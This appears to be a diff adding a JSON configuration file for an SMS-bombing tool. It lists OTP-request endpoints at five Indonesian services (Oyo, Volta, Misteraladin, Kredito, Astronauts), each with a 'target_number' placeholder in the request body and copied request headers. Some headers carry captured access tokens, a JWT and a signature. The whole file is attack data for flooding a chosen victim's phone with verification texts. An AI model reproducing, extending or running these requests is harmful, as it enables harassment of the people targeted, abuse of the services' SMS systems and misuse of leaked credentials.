@@ -1,0 +1,103 @@
+[
+    {
+        "name": "Oyo",
+        "method": "post",
+        "url": "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
+        "data": "{\"phone\": \"target_number\", \"country_code\": \"+62\", \"country_iso_code\": \"ID\", \"nod\": \"4\", \"send_otp\": \"true\", \"devise_role\": \"Consumer_Guest\"}",
+        "headers": {
+            "Host": "identity-gateway.oyorooms.com",
+            "consumer_host": "https://www.oyorooms.com",
+            "accept-language": "id",
+            "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "accept": "*/*",
+            "origin": "https://www.oyorooms.com",
+            "referer": "https://www.oyorooms.com/login",
+            "Accept-Encoding": "gzip,deflate,br"
+        }
+    },
+    {
+        "name": "Volta",
+        "method": "post",
+        "url": "https://auth-production.voltaindonesia.com/v1/client/request-otp",
+        "data": "{\"phoneNumber\": \"target_number\"}",
+        "headers": {
+            "accept": "application/json, text/plain, */*",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-US,en;q=0.9,id;q=0.8",
+            "content-type": "application/json",
+            "origin": "https://voltaindonesia.com",
+            "referer": "https://voltaindonesia.com/",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+        }
+    },
+    {
+        "name": "Misteraladin",
+        "method": "post",
+        "url": "https://m.misteraladin.com/api/members/v2/otp/request",
+        "data": "{\"phone_number_country_code\":\"62\",\"phone_number\":\"target_number\",\"type\":\"register\"}",
+        "headers": {
+            "Host": "m.misteraladin.com",
+            "accept-language": "id",
+            "sec-ch-ua-mobile": "?1",
+            "content-type": "application/json",
+            "accept": "application/json, text/plain, */*",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
+            "x-platform": "mobile-web",
+            "sec-ch-ua-platform": "Android",
+            "origin": "https://m.misteraladin.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://m.misteraladin.com/account",
+            "accept-encoding": "gzip, deflate, br"
+        }
+    },
+    {
+        "name": "Kredito",
+        "method": "post",
+        "url": "https://app-api.kredito.id/client/v1/common/verify-code/send",
+        "data": "{\"event\": \"default_verification\", \"mobilePhone\": \"target_number\", \"sender\": \"jatissms\"}",
+        "headers": {
+            "LPR-TIMESTAMP": "1603281035821",
+            "Accept-Language": "id-ID",
+            "LPR-BRAND": "Kredito",
+            "LPR-PLATFORM": "android",
+            "User-Agent": "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android",
+            "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
+            "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
+            "Content-Type": "application/json; charset=UTF-8",
+            "Content-Length": "79"
+        }
+    },
+    {
+        "name": "AstronautsOTPRequest",
+        "method": "post",
+        "url": "https://api.astronauts.id/api/otp/generate",
+        "data": "{\"phone\": \"target_number\"}",
+        "headers": {
+            "authority": "api.astronauts.id",
+            "method": "POST",
+            "path": "/api/otp/generate",
+            "scheme": "https",
+            "accept": "application/json, text/plain, */*",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-US,en;q=0.9,id;q=0.8",
+            "content-length": "24",
+            "content-type": "application/json",
+            "origin": "https://www.astronauts.id",
+            "referer": "https://www.astronauts.id/",
+            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": "\"Windows\"",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+            "x-api-version": "1.9.4",
+            "x-device": "web-customer",
+            "x-device-version": "2.3.4"
+        }
+    }
+]
